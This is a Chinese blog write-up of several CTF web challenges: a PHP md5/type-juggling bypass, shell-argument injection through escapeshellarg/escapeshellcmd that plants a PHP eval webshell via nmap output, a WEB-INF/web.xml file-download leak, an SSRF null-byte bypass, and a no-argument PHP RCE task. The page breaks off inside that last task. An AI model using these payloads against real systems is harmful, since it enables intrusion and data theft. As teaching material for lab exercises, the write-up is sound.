</span></span><span class=line><span class=cl>                     <span class=nx>highlight_file</span><span class=p>(</span><span class=s1>&#39;flag.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                     <span class=k>die</span><span class=p>(</span><span class=s1>&#39;By Retr_0&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                 <span class=p>}</span>
</span></span><span class=line><span class=cl>                 <span class=k>else</span>
</span></span><span class=line><span class=cl>                 <span class=p>{</span>
</span></span><span class=line><span class=cl>                     <span class=k>echo</span> <span class=s2>&#34;can you think twice??&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                 <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s1>&#39;You can not get it !&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;only one way to get the flag&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;You are not a real hacker!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Please input first&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=nx>Please</span> <span class=nx>input</span> <span class=nx>first</span>
</span></span></code></pre></td></tr></table></div></div><p>分析一波：</p><ul><li>第7行是第一层需要md5的值相同但是两个变量不同，需要注意是强比较<code>===</code>噢。</li><li>第11、17行判断passwd是非数字并且若比较<code>==</code>等于1234567</li></ul><p>第一个利用数组即可绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>md5([1,2,3]) == md5([4,5,6]) == NULL
</span></span></code></pre></td></tr></table></div></div><p>第二个利用比较时会进行类型转换，字符串<code>1234567a</code>会被强制转换类型为整型的<code>1234567</code></p><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id[]=1&amp;gg[]=2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST
</span></span><span class=line><span class=cl>passwd=1234567a
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=buuctf-2018online-tool class=headerLink><a href=#buuctf-2018online-tool class=header-mark></a>[BUUCTF 2018]Online Tool</h1><p>源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;host&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$host</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;host&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$host</span> <span class=o>=</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$host</span> <span class=o>=</span> <span class=nx>escapeshellcmd</span><span class=p>(</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$sandbox</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=s2>&#34;glzjin&#34;</span><span class=o>.</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;you are in sandbox &#39;</span><span class=o>.</span><span class=nv>$sandbox</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=nx>mkdir</span><span class=p>(</span><span class=nv>$sandbox</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>chdir</span><span class=p>(</span><span class=nv>$sandbox</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;</span><span class=o>.</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>最后有一个system函数，但是使用的nmap的指令，经过一番搜索得知了nmap可以把结果存储在文件里，所以这道题也是道RCE。还有两个没见过的函数<code>escapeshellarg</code>、<code>escapeshellcmd</code>。</p><p>这道题利用了两个点</p><ol><li><p>nmap可以将扫描的结果存储在文件里。使用方法：<a href=https://blog.csdn.net/weixin_34221036/article/details/92148628 target=_blank rel="noopener noreffer">Nmap扫描结果的保存和输出</a></p></li><li><p>escapeshellarg+escapeshellcmd同时使用有一些漏洞</p><blockquote><p><a href=http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/ target=_blank rel="noopener noreffer">谈谈escapeshellarg参数绕过和注入的问题</a></p><p><a href=https://paper.seebug.org/164/ target=_blank rel="noopener noreffer">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p></blockquote></li></ol><p>参考博客整理一下这两个处理命令的函数同时使用时的问题：</p><ol><li>假如传入的参数为<code>172.17.0.2' -v -d a=1</code></li><li>首先经过<code>escapeshellarg</code>函数，这个函数会把单独的单引号<code>'</code>加上转义符<code>\</code>并使用单引号<code>'</code>括起来，再使用单引号<code>'</code>把整个参数括起来。这时候的参数是<code>'172.17.0.2'\'' -v -d a=1'</code></li><li>再进入<code>escapeshellcmd</code>函数，这个函数（从左至右会把落单的符号直接加转义符，其他什么都不做）遇到成对匹配的单引号<code>'</code>不过处理，转义符<code>\</code>再使用转义符转义，再略过一个成对的单引号<code>''</code>，最后一个单引号<code>'</code>再使用转义符转义。这时候的参数就成了<code>'172.17.0.2'\\'' -v -d a=1\'</code></li><li>最后执行的参数是<code>'172.17.0.2'\\'' -v -d a=1\'</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>'</code>没有被转义，与再后面的<code>'</code>配对儿成了一个空白符。所以可以简化为<code> 172.17.0.2\ -v -d a=1'</code></li></ol><p>所以构造payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;&lt;?php eval($_POST[_]) ?&gt; -oG 1.php &#39;
</span></span></code></pre></td></tr></table></div></div><p>经过<code>escapeshellarg</code>函数会被解析成为：<code>''\''&lt;?php eval($_POST[_]) ?> -oG 1.php '\'''</code></p><p>再经过<code>escapeshellcmd</code>函数会被解析为：<code>''\\''&lt;?php eval($_POST[_]) ?> -oG 1.php '\\'''</code></p><p>注意最后单引号前面的那个空格很重要，如果是紧挨着的话文件名称就成了<code>1.php\</code>不在是php文件了。所以我们的payload最终在服务器端是：<code>\&lt;?php eval($_POST[_]) ?> -oG 1.php \ </code>。</p><p>加空格目的是为了防止文件名后缀中出现符号，加上空格就会舍去。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$host</span> <span class=o>=</span> <span class=s2>&#34;&#39;&lt;?php eval(</span><span class=si>$_POST[_]</span><span class=s2>) ?&gt; -oG 1.php &#39;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$host</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$host</span> <span class=o>=</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$host</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$host</span> <span class=o>=</span> <span class=nx>escapeshellcmd</span><span class=p>(</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$host</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>结果：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;&lt;?php eval() ?&gt; -oG 1.php &#39;
</span></span><span class=line><span class=cl>&#39;&#39;\&#39;&#39;&lt;?php eval() ?&gt; -oG 1.php &#39;\&#39;&#39;&#39;
</span></span><span class=line><span class=cl>&#39;&#39;\\&#39;&#39;\&lt;\?php eval\(\) \?\&gt; -oG 1.php &#39;\\&#39;&#39;&#39;
</span></span></code></pre></td></tr></table></div></div><p>最终请求payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/?host=&#39;&lt;?php eval($_POST[_]) ?&gt; -oG 1.php &#39;
</span></span></code></pre></td></tr></table></div></div><p>执行指令时会创建一个sandbox文件夹，访问<code>$sandbox$/1.php</code>，POST传参</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110615.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110615.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110615.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110615.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110615.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110615.png></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>_=system(&#39;cat /flag&#39;);
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110726.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110726.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110726.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110726.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110726.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110726.png></p><hr><h1 id=roarctf-2019easy-java class=headerLink><a href=#roarctf-2019easy-java class=header-mark></a>[RoarCTF 2019]Easy Java</h1><p>是java写的web程序</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110821.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110821.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110821.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110821.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110821.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110821.png></p><p>考点是<strong>WEB-INF/web.xml泄露</strong></p><blockquote><p>WEB-INF主要包含一下文件或目录:</p><p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p><p>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</p><p>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</p><p>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</p><p>/WEB-INF/database.properties：数据库配置文件</p><p>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p></blockquote><p>重点不在登陆界面，而是那个Help按钮，可以下载文件。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110934.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110934.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110934.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110934.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110934.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110934.png></p><p>首先尝试去读web.xml文档，添加POST请求</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>filename=WEB-INF/web.xml
</span></span></code></pre></td></tr></table></div></div><p>可以读取web.xml文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;web-app</span> <span class=na>xmlns=</span><span class=s>&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;</span>
</span></span><span class=line><span class=cl>         <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class=line><span class=cl>         <span class=na>xsi:schemaLocation=</span><span class=s>&#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&#34;</span>
</span></span><span class=line><span class=cl>         <span class=na>version=</span><span class=s>&#34;4.0&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;welcome-file-list&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;welcome-file&gt;</span>Index<span class=nt>&lt;/welcome-file&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/welcome-file-list&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>IndexController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-class&gt;</span>com.wm.ctf.IndexController<span class=nt>&lt;/servlet-class&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>IndexController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;url-pattern&gt;</span>/Index<span class=nt>&lt;/url-pattern&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>LoginController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-class&gt;</span>com.wm.ctf.LoginController<span class=nt>&lt;/servlet-class&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>LoginController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;url-pattern&gt;</span>/Login<span class=nt>&lt;/url-pattern&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>DownloadController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-class&gt;</span>com.wm.ctf.DownloadController<span class=nt>&lt;/servlet-class&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>DownloadController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;url-pattern&gt;</span>/Download<span class=nt>&lt;/url-pattern&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>FlagController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-class&gt;</span>com.wm.ctf.FlagController<span class=nt>&lt;/servlet-class&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>FlagController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;url-pattern&gt;</span>/Flag<span class=nt>&lt;/url-pattern&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;/web-app&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>注意到了一个<code>FlagController</code>的控制器，它所在的类为<code>com.wm.ctf.FlagController</code>，前面也提到了编译文件所在的文件夹<code>/WEB-INF/classes/</code>，去这个文件夹下载<code>FlagController</code>相关的文件，还需要知道的是：Javaweb程序编译文件的目录结构是根据类名创建的，类名我们也知道了，所以下载：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>filename=WEB-INF/classes/com/wm/ctf/FlagController.class
</span></span></code></pre></td></tr></table></div></div><p>class文件源码好多不可见字符</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310112205.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310112205.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310112205.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310112205.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310112205.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310112205.png></p><p>我选中的那段就是flag在的地方，看到了<code>==</code>就应该意识到是base64编码，但是base64编码里没有<code>&lt;</code>这个字符，所以flag的密文就是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ZmxhZ3s0NmNhMTExMS01ZjI5LTQwYjMtYjUwMC1lYWMzZjkyMjU4ODF9Cg==
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=-----------------------以下部分施工中------------------------ class=headerLink><a href=#-----------------------%e4%bb%a5%e4%b8%8b%e9%83%a8%e5%88%86%e6%96%bd%e5%b7%a5%e4%b8%ad------------------------ class=header-mark></a>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;以下部分施工中👷‍♂️&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;</h1><p>下面的都是没有整理，先把重要思路写下来了，然后有时间再配图</p><hr><h1 id=gkctf2020cve版签到 class=headerLink><a href=#gkctf2020cve%e7%89%88%e7%ad%be%e5%88%b0 class=header-mark></a>[GKCTF2020]cve版签到</h1><p><a href=https://blog.csdn.net/qq_45521281/article/details/106425266 target=_blank rel="noopener noreffer">CVE-2020-7066</a></p><p>只有一个按钮，点击以后查看网页的Network请求中有一个</p><blockquote><p>Hint: Flag in localhost</p></blockquote><p>且utl地址中有可控的参数，所以应该是使用ssrf。这里还有一个提示是在主页面那里</p><blockquote><p>You just view *.ctfhub.com</p></blockquote><p>只可以访问以ctfhub.com结尾的网站，再根据cve使用%00截断访问：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?url=http://127.0.0.1%00.ctfhub.com
</span></span></code></pre></td></tr></table></div></div><p>第二个提示：</p><blockquote><p>Host must be end with &lsquo;123&rsquo;</p></blockquote><p>必须以123结尾，所以最终payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?url=http://127.0.0.123%00.ctfhub.com
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=gxyctf2019禁止套娃 class=headerLink><a href=#gxyctf2019%e7%a6%81%e6%ad%a2%e5%a5%97%e5%a8%83 class=header-mark></a>[GXYCTF2019]禁止套娃</h1><p>git泄露。我使用的https://github.com/gakki429/Git_Extract</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>include &#34;flag.php&#34;;
</span></span><span class=line><span class=cl>echo &#34;flag在哪里呢？&lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>if(isset($_GET[&#39;exp&#39;])){
</span></span><span class=line><span class=cl>    if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) {
</span></span><span class=line><span class=cl>        if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) {
</span></span><span class=line><span class=cl>            if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) {
</span></span><span class=line><span class=cl>                // echo $_GET[&#39;exp&#39;];
</span></span><span class=line><span class=cl>                @eval($_GET[&#39;exp&#39;]);
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>            else{
</span></span><span class=line><span class=cl>                die(&#34;还差一点哦！&#34;);
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>        else{
</span></span><span class=line><span class=cl>            die(&#34;再好好想想！&#34;);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    else{
</span></span><span class=line><span class=cl>        die(&#34;还想读flag，臭弟弟！&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>// highlight_file(__FILE__);
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>正则表达式匹配的只有函数的形式如<code>var_dump();</code>是一道<a href=https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/ target=_blank rel="noopener noreffer">无参数RCE</a>，看的题解自己整理的payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
